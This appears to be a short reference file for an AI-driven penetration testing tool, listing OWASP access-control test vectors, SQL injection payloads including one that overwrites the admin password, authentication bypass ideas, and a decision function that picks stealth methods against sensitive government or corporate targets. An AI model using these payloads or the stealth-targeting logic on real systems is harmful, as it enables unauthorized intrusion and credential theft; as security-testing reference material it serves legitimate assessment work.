##  OWASP Top 10 Elite Testing

### A01 - Broken Access Control
```python
# Advanced Access Control Tests
test_vectors = [
    # Horizontal Privilege Escalation
    "GET /user/profile?id=1 -> /user/profile?id=2",
    "POST /api/users/me -> /api/users/admin",
    
    # Vertical Privilege Escalation  
    "user role -> admin role via parameter manipulation",
    "guest access -> authenticated user via session manipulation",
    
    # Direct Object References
    "/documents/sensitive.pdf via forced browsing",
    "/admin/users/delete/1 via URL manipulation"
]
```

### A03 - Injection Attacks
```python
# Elite SQL Injection Payloads
advanced_sqli = [
    # Time-based blind
    "admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Union-based extraction
    "' UNION SELECT username,password FROM users WHERE '1'='1",
    
    # Boolean-based blind
    "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
    
    # Second-order injection
    "admin';UPDATE users SET password='hacked' WHERE username='admin'--"
]
```

### A07 - Authentication Failures
```python
# Advanced Authentication Tests
auth_tests = [
    # Session fixation
    "Set session ID before login, check if preserved after",
    
    # Weak password policies
    "Test common passwords: password123, admin123, qwerty",
    
    # Account enumeration
    "Different responses for valid vs invalid usernames",
    
    # Rate limiting bypass
    "X-Forwarded-For header manipulation for IP rotation"
]
```

##  AI Decision Engine Logic

### Risk Assessment Matrix:
```python
risk_factors = {
    "stealth_required": 0.8,    # High stealth requirement
    "target_sensitivity": 0.9,  # Government/military = high
    "detection_capability": 0.7, # Advanced monitoring
    "time_constraints": 0.5,    # Moderate time pressure
    "legal_boundaries": 1.0     # Must stay within legal bounds
}

# Calculate overall risk score
risk_score = sum(risk_factors.values()) / len(risk_factors)
```

### Methodology Selection:
```python
def select_methodology(target_type, risk_score, time_available):
    if target_type == "educational" and risk_score < 0.5:
        return "academic_demonstration"
    elif target_type == "corporate" and risk_score > 0.7:
        return "stealth_penetration"
    elif time_available < 24:  # hours
        return "rapid_assessment"
    else:
        return "comprehensive_analysis"
```
